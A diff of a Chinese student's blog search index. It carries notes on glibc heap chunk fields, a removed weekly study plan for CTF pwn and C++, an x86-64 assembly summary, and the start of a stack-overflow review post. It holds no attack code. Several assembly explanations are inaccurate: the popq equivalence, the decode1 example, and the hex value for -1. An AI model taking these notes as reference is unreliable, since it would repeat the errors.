+<p>​      <code> PREV_INUSE</code>，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
 <p><strong>3..user data</strong> 就是用来存放用户数据的。使用malloc函数分配到的内存的返回地址是指user data(用户数据区)</p>
 <p>例如在64位程序中：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
@@ -766,92 +874,6 @@
       </tags>
   </entry>
   <entry>
-    <title>周计划</title>
-    <url>/2023/03/04/%E5%91%A8%E8%AE%A1%E5%88%92-1/</url>
-    <content><![CDATA[<h1 id="大一下学期目标"><a href="#大一下学期目标" class="headerlink" title="大一下学期目标"></a>大一下学期目标</h1><p><strong>主线</strong>：<strong>学习pwn的栈 堆和内核，学习计算机系统基础</strong></p>
-<p><strong>主线</strong>：<strong>完成现代c++的学习</strong></p>
-<p><strong>《深入了解操作系统》的阅读以及lab的练习</strong></p>
-<p><strong>完成<em>MIT.6S081</em>课程学习和lab的练习</strong></p>
-<h2 id="第4周"><a href="#第4周" class="headerlink" title="第4周"></a>第4周</h2><p>总目标：</p>
-<p><strong>现代c++：</strong>part1，part2 </p>
-<p><strong>pwn：</strong>理解堆</p>
-<p><strong>xv6：</strong>lab1完成</p>
-<p><strong>re:</strong> 简单了解逆向</p>
-<h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><p>现代c++：程序的执行过程，new关键字及内存内存，命名空间，c++的标准输入输出简历</p>
-<p>pwn：堆理解</p>
-<p>逆向刷题</p>
-<p>pwn刷题</p>
-<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>现代c++：const关键字介绍 ，auto关键字使用</p>
-<p>pwn ：刷题整理</p>
-<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>划水</p>
-<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><p>现代c++：静态变量，指针和引用 ，左值，右值，左值引用，右值引用，move函数，临时对象 ，可调用对象</p>
-<p>pwn:pwn栈题总结</p>
-<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><p>划水</p>
-<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><p>xv6操作系统lab1完成</p>
-<h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><p>划水</p>
-<h2 id="第五周"><a href="#第五周" class="headerlink" title="第五周"></a>第五周</h2><p>总目标：</p>
-<p>现代c++：part3，part4</p>
-<p>堆：深入理解并开始刷题，栈题整理</p>
-<p>csapp：第一章第二章</p>
-<h3 id="周一-1"><a href="#周一-1" class="headerlink" title="周一"></a>周一</h3><p>现代c++：类介绍，构造函数，析构函数，this，长成员函数于常对象，inline，mutable，default，delete</p>
-<p>pwn:栈题整理</p>
-<h3 id="周二-1"><a href="#周二-1" class="headerlink" title="周二"></a>周二</h3><p>现代c++：友元类和友元函数， 重载运算符，普通继承及其实现原理</p>
-<p>pwn:栈题整理，堆理解</p>
-<h3 id="周三-1"><a href="#周三-1" class="headerlink" title="周三"></a>周三</h3><p>理解堆</p>
-<h3 id="周四-1"><a href="#周四-1" class="headerlink" title="周四"></a>周四</h3><p>现代c++：虚函数及其实现原理 override关键字 ，静态成员变量与静态函数 ， 纯虚函数 ，RTTL</p>
-<h3 id="周五-1"><a href="#周五-1" class="headerlink" title="周五"></a>周五</h3><p>现代c++：多继承 ， 虚继承及其实现原理 ，智能指针概述</p>
-<h3 id="周六-1"><a href="#周六-1" class="headerlink" title="周六"></a>周六</h3><p>pwn：堆：main_arena和top chunk ， free函数和bins</p>
-<h3 id="周日-1"><a href="#周日-1" class="headerlink" title="周日"></a>周日</h3><p>划水</p>
-<h2 id="第六周"><a href="#第六周" class="headerlink" title="第六周"></a>第六周</h2><p>总目标：</p>
-<p>现代c++：智能指针，模板与泛型编程，复习</p>
-<p>pwn：堆题入门，gdb pwntools使用，栈刷题</p>
-<p>《程序员的自我修养》阅读</p>
-<h3 id="周一-2"><a href="#周一-2" class="headerlink" title="周一"></a>周一</h3><p>现代c++：shard_ptr ， weak_ptr</p>
-<p>pwn：堆深入理解并尝试例题</p>
-<h3 id="周二-2"><a href="#周二-2" class="headerlink" title="周二"></a>周二</h3><p>现代c++:uniqe_ptr,指针使用范围</p>
-<p>pwn:栈复习，堆理解</p>
-<h3 id="周三-2"><a href="#周三-2" class="headerlink" title="周三"></a>周三</h3><p>现代c++模板介绍，类模板与模板实现原理</p>
-<h3 id="周四-2"><a href="#周四-2" class="headerlink" title="周四"></a>周四</h3><p>周四发现甲流了(其实周三就有点感觉了)，一直到周日没翻开过电脑</p>
-<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-03-27 171751.png)</p>
-<h2 id="第七周"><a href="#第七周" class="headerlink" title="第七周"></a>第七周</h2><p>总目标：</p>
-<p>8086汇编</p>
-<p>现代c++:模板与泛型编程</p>
-<h3 id="周一-3"><a href="#周一-3" class="headerlink" title="周一"></a>周一</h3><p>现代c++:模板与泛型编程，类模板与模板实现原理，intitializer_list与typename</p>
-<h3 id="周二-3"><a href="#周二-3" class="headerlink" title="周二"></a>周二</h3><p>现代c++:函数模板，成员函数模板</p>
-<p>8086汇编：一到四章</p>
-<h3 id="周三-3"><a href="#周三-3" class="headerlink" title="周三"></a>周三</h3><p>现代c++:默认模板参数， 模板的重载，全特化和偏特化</p>
-<p>8086汇编：五到八章</p>
-<h3 id="周四到周日"><a href="#周四到周日" class="headerlink" title="周四到周日"></a>周四到周日</h3><p>hhh，去徐州旅游了，体验了大学生的生活，寻找了自我</p>
-<h2 id="第八周"><a href="#第八周" class="headerlink" title="第八周"></a>第八周</h2><p>总目标:</p>
-<p>上周深得大佬指点，这种重新规划了一下学习路线</p>
-<p>1：从本周开始：现代c++的学习先暂停，开启慕课计算机基础的学习</p>
-<p>2.继续坚持ctfpwn方向的刷题和学习</p>
-<p>3.开始学习其他的方向：re，web，密码</p>
-<h3 id="周一-4"><a href="#周一-4" class="headerlink" title="周一"></a>周一</h3><p>计算机系统基础：第一周：计算机系统概述</p>
-<h3 id="周二周三"><a href="#周二周三" class="headerlink" title="周二周三"></a>周二周三</h3><p>摆烂了</p>
-<h3 id="周四-3"><a href="#周四-3" class="headerlink" title="周四"></a>周四</h3><p>继续摆烂，练几道re</p>
-<h3 id="周五周六"><a href="#周五周六" class="headerlink" title="周五周六"></a>周五周六</h3><p>摆烂的情况下慢慢推进pwn的堆学习</p>
-<h3 id="周日-2"><a href="#周日-2" class="headerlink" title="周日"></a>周日</h3><p>继续学习pwn的堆(以后一定要用更多时间学习，真的难了)</p>
-<h2 id="第九周"><a href="#第九周" class="headerlink" title="第九周"></a>第九周</h2><p>总目标：</p>
-<p>计算机基础慢慢听</p>
-<p>加速推进pwn的学习</p>
-<h3 id="周一-5"><a href="#周一-5" class="headerlink" title="周一"></a>周一</h3><p>解决一道堆题</p>
-<p>练习re</p>
-<p>整理编码</p>
-<h3 id="周二-4"><a href="#周二-4" class="headerlink" title="周二"></a>周二</h3><p>计算机系统基础：数据的表示和存储</p>
-<h3 id="周三-4"><a href="#周三-4" class="headerlink" title="周三"></a>周三</h3><p>pwn工具使用</p>
-<h3 id="周四-4"><a href="#周四-4" class="headerlink" title="周四"></a>周四</h3><p>练题</p>
-<h3 id="周五-2"><a href="#周五-2" class="headerlink" title="周五"></a>周五</h3><p>将栈迁移弄明白，解决iscc一道pwn题，准备周六的比赛</p>
-<h3 id="周六-2"><a href="#周六-2" class="headerlink" title="周六"></a>周六</h3><p>比赛</p>
-]]></content>
-      <categories>
-        <category>计划</category>
-      </categories>
-      <tags>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见加密算法和编码识别</title>
     <url>/2023/04/10/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%92%8C%E7%BC%96%E7%A0%81%E8%AF%86%E5%88%AB/</url>
     <content><![CDATA[<p>参考资料来自wiki</p>
@@ -933,6 +955,53 @@
       </categories>
       <tags>
         <tag>加密编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>汇编语言简单摘要</title>
+    <url>/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/</url>
+    <content><![CDATA[<h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
+<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>
+
+<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
+<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov 数据传送指令 将数据从一个位置复制到另一个位置的指令<br>mov 寄存器&#x2F;立即数 操作数用来指向一个执行所要使用源数据的值，放置结果的目的位置，mov 源操作数的值是一个立即数，值存放在内存或者寄存器中 目的操作数一个寄存器或者是一个内存地址。</p>
+<p><strong>单位</strong>：1字节 &#x3D; 8bit  1字 &#x3D; 8字节 &#x3D; 64bit</p>
+<p><strong>movb 一个字节</strong> (这个字代表双字节的意思，与上边的字不一样)<br><strong>movw 一个字<br>movl 双字（寄存器的高四字节设置成0）<br>movq 四字<br>movabsq I,R  R&lt;-I 传送的是绝对的四字 目的操作数只能是寄存器</strong><br>movl $0x4050,%eax      4bytes   立即数–寄存器<br>movw %bp,%sp           2bytes   寄存器–寄存器<br>movb (%rdi,%rcx),%al   1bytes  内存–寄存器<br>movb $-17,(%rsp)       1bytes   立即数–内存<br>movq %rax,-12(%rbp)    8bytes   寄存器–内存l</p>
+<h5 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">movabsq <span class="variable">$0x0011223344556677</span> , %rax = 0011223344556677  </span><br><span class="line">（ rax包含了eax eax包含了ax ax包含了al）</span><br><span class="line">-1的16进制是0xFFFFFFFFFFFFFF,第一步结束后每一步rax的值是多少</span><br><span class="line">movb $-1 ,%al           ， %rax = 00112233445566FF   F = 1111</span><br><span class="line">movw $-1 , %ax          ， %rax = 001122334455FFFF   </span><br><span class="line">movl $-1 , %eax         ， %rax = 00000000FFFFFFFF</span><br><span class="line">movq $-1 ,%rax          ， %rax = FFFFFFFFFFFFFFFF </span><br></pre></td></tr></table></figure>
+
+
+<h5 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h5><p>把下列汇编代码用c语言表示  （rax一直保存的是返回值）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode1:</span><br><span class="line">    movq (%rdi) , %r8</span><br><span class="line">    movq (%rsi) , %rcx</span><br><span class="line">    movq (%rdx) , %rax</span><br><span class="line">    movq %r8    , (%rsi)</span><br><span class="line">    movq %rcx   , (%rdx)</span><br><span class="line">    movq %rax ,   (%rdx)      </span><br><span class="line">    ret </span><br></pre></td></tr></table></figure>
+<p>c语言</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode1</span><span class="params">(<span class="type">long</span> *xp,<span class="type">long</span> *yp,<span class="type">long</span> *zp)</span>&#123;</span><br><span class="line">     <span class="type">long</span> x = *xp;</span><br><span class="line">     <span class="type">long</span> y = *yp;</span><br><span class="line">     <span class="type">long</span> z = *zp;</span><br><span class="line">     *yp = x;</span><br><span class="line">     *zp = y;</span><br><span class="line">     *xp = z;</span><br><span class="line">     <span class="keyword">return</span> z;</span><br><span class="line"> &#125;    </span><br><span class="line">     </span><br></pre></td></tr></table></figure>
+<h4 id="push和pop"><a href="#push和pop" class="headerlink" title="push和pop"></a>push和pop</h4><p>push压入栈 pop弹出栈（pop弹出的值一直是一个最近压入栈的数据且仍在栈中）<br>由于栈是由大到小增长的，所以栈顶永远是地址最低的 %rsp保存着栈顶的元素<br>pushq popq 将四字压入栈中 将四字弹出栈<br>pushq %rbp &#x3D; subq $8,%rsp  movq %rbp,(%rsp)   （rsp地址减8）<br>popq <strong>%rax</strong>  &lt;&#x3D;&#x3D;&gt; movq (%rsp),(<strong>%rax</strong>) addq $8,%rsp （rsp地址加8）<br><strong>pop之后，值不会被删除，除非有一个新的值覆盖了原先的值</strong></p>
+<h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">leaq  --&gt; 加载有效地址 </span><br><span class="line">inc --&gt; 加一 </span><br><span class="line">dec --&gt; 减一 </span><br><span class="line">neg --&gt; 取负 </span><br><span class="line">not --&gt; 取补 </span><br><span class="line">add --&gt; 加 </span><br><span class="line">sub --&gt; 减 </span><br><span class="line">imul --&gt; 乘 </span><br><span class="line">xor --&gt; 异或 </span><br><span class="line">or --&gt; 或 </span><br><span class="line">and --&gt; 与 </span><br><span class="line">sal --&gt; 算数左移 </span><br><span class="line"> sar --&gt; 算数右移 </span><br><span class="line"> shl --&gt;逻辑左移</span><br><span class="line">shr --&gt; 逻辑右移</span><br></pre></td></tr></table></figure>
+<h5 id="1-加载地址"><a href="#1-加载地址" class="headerlink" title="1.加载地址"></a>1.加载地址</h5><p>movq的一种变形 从内存读数据到寄存器 但是没有引用内存 不是单纯的读数据，而是将有效地址加载到目的操作数 <strong>描述简单的算数操作</strong></p>
+<h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p>rdi &#x3D; x<br> leaq 7(%rdi,%rdi,4),%rax &#x3D;&#x3D; 将rax的值设置为5x+7</p>
+<h5 id="2-一元操作和二元操作"><a href="#2-一元操作和二元操作" class="headerlink" title="2.一元操作和二元操作"></a>2.一元操作和二元操作</h5><p> 只有一个操作数的是一元操作，既是源操作数也是目的操作数<br>地址          值              寄存器       值<br>0x100      0xFF             rax        0x100<br>0x108      0xAB             rcx        0x1<br> 0x118  0x11           rdx        0x3<br><strong>subq</strong> %rax,%rdx rdx &#x3D; rdx -rax<br><strong>addq</strong> %rcx , (%rax)   ;更新的其实是一个内存位置 位置为0x100<br><strong>imulq</strong> $16,(%rax,%rdx,8) ;更新的内存位置是0x118，值对应的是0x11*16&#x3D;0x110<br>他们的目的和最终值写出来<br>imulq 有符号乘法 一个操作数 这个指令要求就是必须两个数都在寄存器rax中 把高64位存放在rdx，低64位存放在rax里面<br><strong>salq</strong> $4,%rax(左移4位，扩大了2的4次方倍)</p>
+<h5 id="控制操作"><a href="#控制操作" class="headerlink" title="控制操作"></a>控制操作</h5><p>t  &#x3D; a + b<br>无符号溢出 <strong>CF</strong> （条件码）<br>  t&#x3D;&#x3D;0 <strong>ZF</strong><br> t &lt; 0  <strong>SF</strong><br> (a&lt;0&amp;&amp;b&lt;0) &amp;&amp; (t&lt;0 !&#x3D; a &lt;0) 有符号溢出 <strong>OF</strong><br><strong>leaq</strong> 不会改变任何条件码 xor 会将进位标志和溢出位标志设置成0<br><strong>cmpb</strong> 比较字节 <strong>cmpw</strong> 比较字  <strong>test</strong> 测试<br><strong>cmp</strong> rsi,rdi<br>cmp根据两个比较数的差来设置条件码 （除了不更新寄存器以外，和sub操作是一样的 test也是除了不更新寄存器以外，和 and 操作是一样的）<br><strong>testq</strong> %rax,%rax 检查rax是负数还是正数还是0<br> set指令设置条件码</p>
+]]></content>
+      <categories>
+        <category>pwn基础</category>
+      </categories>
+      <tags>
+        <tag>汇编</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈复习与深度学习</title>
+    <url>/2023/04/20/%E6%A0%88%E5%A4%8D%E4%B9%A0%E4%B8%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p><strong>前言：</strong>最近开始学堆了，但是栈方面只掌握一些的简单的rop利用，之所以写这个文章就是想着先进行复习再继续学习栈的高级利用方式（堆学习也不会落下），前面可能写的比较简单，后面的高级利用会进行详写。（文章学习来自Wiki）</p>
+<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>栈是一种先进后出的数据结构，操作主要有压栈(push)和出栈(pop),汇编语言运行时，会充分利用栈，每个程序运行时都有虚拟地址空间，其中一部分就是该程序对应的栈，保存函数调用信息和局部变量。程序的栈从进程地址空间的高地址向低地址增长的。</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1137,40 +1206,6 @@
       </categories>
       <tags>
         <tag>c++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>汇编语言简单摘要</title>
-    <url>/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/</url>
-    <content><![CDATA[<h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
-<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
-<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>
-
-<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
-<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov 数据传送指令 将数据从一个位置复制到另一个位置的指令<br>mov 寄存器&#x2F;立即数 操作数用来指向一个执行所要使用源数据的值，放置结果的目的位置，mov 源操作数的值是一个立即数，值存放在内存或者寄存器中 目的操作数一个寄存器或者是一个内存地址。</p>
-<p><strong>单位</strong>：1字节 &#x3D; 8bit  1字 &#x3D; 8字节 &#x3D; 64bit</p>
-<p><strong>movb 一个字节</strong> (这个字代表双字节的意思，与上边的字不一样)<br><strong>movw 一个字<br>movl 双字（寄存器的高四字节设置成0）<br>movq 四字<br>movabsq I,R  R&lt;-I 传送的是绝对的四字 目的操作数只能是寄存器</strong><br>movl $0x4050,%eax      4bytes   立即数–寄存器<br>movw %bp,%sp           2bytes   寄存器–寄存器<br>movb (%rdi,%rcx),%al   1bytes  内存–寄存器<br>movb $-17,(%rsp)       1bytes   立即数–内存<br>movq %rax,-12(%rbp)    8bytes   寄存器–内存l</p>
-<h5 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">movabsq <span class="variable">$0x0011223344556677</span> , %rax = 0011223344556677  </span><br><span class="line">（ rax包含了eax eax包含了ax ax包含了al）</span><br><span class="line">-1的16进制是0xFFFFFFFFFFFFFF,第一步结束后每一步rax的值是多少</span><br><span class="line">movb $-1 ,%al           ， %rax = 00112233445566FF   F = 1111</span><br><span class="line">movw $-1 , %ax          ， %rax = 001122334455FFFF   </span><br><span class="line">movl $-1 , %eax         ， %rax = 00000000FFFFFFFF</span><br><span class="line">movq $-1 ,%rax          ， %rax = FFFFFFFFFFFFFFFF </span><br></pre></td></tr></table></figure>
-
-
-<h5 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h5><p>把下列汇编代码用c语言表示  （rax一直保存的是返回值）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode1:</span><br><span class="line">    movq (%rdi) , %r8</span><br><span class="line">    movq (%rsi) , %rcx</span><br><span class="line">    movq (%rdx) , %rax</span><br><span class="line">    movq %r8    , (%rsi)</span><br><span class="line">    movq %rcx   , (%rdx)</span><br><span class="line">    movq %rax ,   (%rdx)      </span><br><span class="line">    ret </span><br></pre></td></tr></table></figure>
-<p>c语言</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode1</span><span class="params">(<span class="type">long</span> *xp,<span class="type">long</span> *yp,<span class="type">long</span> *zp)</span>&#123;</span><br><span class="line">     <span class="type">long</span> x = *xp;</span><br><span class="line">     <span class="type">long</span> y = *yp;</span><br><span class="line">     <span class="type">long</span> z = *zp;</span><br><span class="line">     *yp = x;</span><br><span class="line">     *zp = y;</span><br><span class="line">     *xp = z;</span><br><span class="line">     <span class="keyword">return</span> z;</span><br><span class="line"> &#125;    </span><br><span class="line">     </span><br></pre></td></tr></table></figure>
-<h4 id="push和pop"><a href="#push和pop" class="headerlink" title="push和pop"></a>push和pop</h4><p>push压入栈 pop弹出栈（pop弹出的值一直是一个最近压入栈的数据且仍在栈中）<br>由于栈是由大到小增长的，所以栈顶永远是地址最低的 %rsp保存着栈顶的元素<br>pushq popq 将四字压入栈中 将四字弹出栈<br>pushq %rbp &#x3D; subq $8,%rsp  movq %rbp,(%rsp)   （rsp地址减8）<br>popq <strong>%rax</strong>  &lt;&#x3D;&#x3D;&gt; movq (%rsp),(<strong>%rax</strong>) addq $8,%rsp （rsp地址加8）<br><strong>pop之后，值不会被删除，除非有一个新的值覆盖了原先的值</strong></p>
-<h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">leaq  --&gt; 加载有效地址 </span><br><span class="line">inc --&gt; 加一 </span><br><span class="line">dec --&gt; 减一 </span><br><span class="line">neg --&gt; 取负 </span><br><span class="line">not --&gt; 取补 </span><br><span class="line">add --&gt; 加 </span><br><span class="line">sub --&gt; 减 </span><br><span class="line">imul --&gt; 乘 </span><br><span class="line">xor --&gt; 异或 </span><br><span class="line">or --&gt; 或 </span><br><span class="line">and --&gt; 与 </span><br><span class="line">sal --&gt; 算数左移 </span><br><span class="line"> sar --&gt; 算数右移 </span><br><span class="line"> shl --&gt;逻辑左移</span><br><span class="line">shr --&gt; 逻辑右移</span><br></pre></td></tr></table></figure>
-<h5 id="1-加载地址"><a href="#1-加载地址" class="headerlink" title="1.加载地址"></a>1.加载地址</h5><p>movq的一种变形 从内存读数据到寄存器 但是没有引用内存 不是单纯的读数据，而是将有效地址加载到目的操作数 <strong>描述简单的算数操作</strong></p>
-<h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p>rdi &#x3D; x<br> leaq 7(%rdi,%rdi,4),%rax &#x3D;&#x3D; 将rax的值设置为5x+7</p>
-<h5 id="2-一元操作和二元操作"><a href="#2-一元操作和二元操作" class="headerlink" title="2.一元操作和二元操作"></a>2.一元操作和二元操作</h5><p> 只有一个操作数的是一元操作，既是源操作数也是目的操作数<br>地址          值              寄存器       值<br>0x100      0xFF             rax        0x100<br>0x108      0xAB             rcx        0x1<br> 0x118  0x11           rdx        0x3<br><strong>subq</strong> %rax,%rdx rdx &#x3D; rdx -rax<br><strong>addq</strong> %rcx , (%rax)   ;更新的其实是一个内存位置 位置为0x100<br><strong>imulq</strong> $16,(%rax,%rdx,8) ;更新的内存位置是0x118，值对应的是0x11*16&#x3D;0x110<br>他们的目的和最终值写出来<br>imulq 有符号乘法 一个操作数 这个指令要求就是必须两个数都在寄存器rax中 把高64位存放在rdx，低64位存放在rax里面<br><strong>salq</strong> $4,%rax(左移4位，扩大了2的4次方倍)</p>
-<h5 id="控制操作"><a href="#控制操作" class="headerlink" title="控制操作"></a>控制操作</h5><p>t  &#x3D; a + b<br>无符号溢出 <strong>CF</strong> （条件码）<br>  t&#x3D;&#x3D;0 <strong>ZF</strong><br> t &lt; 0  <strong>SF</strong><br> (a&lt;0&amp;&amp;b&lt;0) &amp;&amp; (t&lt;0 !&#x3D; a &lt;0) 有符号溢出 <strong>OF</strong><br><strong>leaq</strong> 不会改变任何条件码 xor 会将进位标志和溢出位标志设置成0<br><strong>cmpb</strong> 比较字节 <strong>cmpw</strong> 比较字  <strong>test</strong> 测试<br><strong>cmp</strong> rsi,rdi<br>cmp根据两个比较数的差来设置条件码 （除了不更新寄存器以外，和sub操作是一样的 test也是除了不更新寄存器以外，和 and 操作是一样的）<br><strong>testq</strong> %rax,%rax 检查rax是负数还是正数还是0<br> set指令设置条件码</p>
-]]></content>
-      <categories>
-        <category>pwn基础</category>
-      </categories>
-      <tags>
-        <tag>汇编</tag>
       </tags>
   </entry>
   <entry>
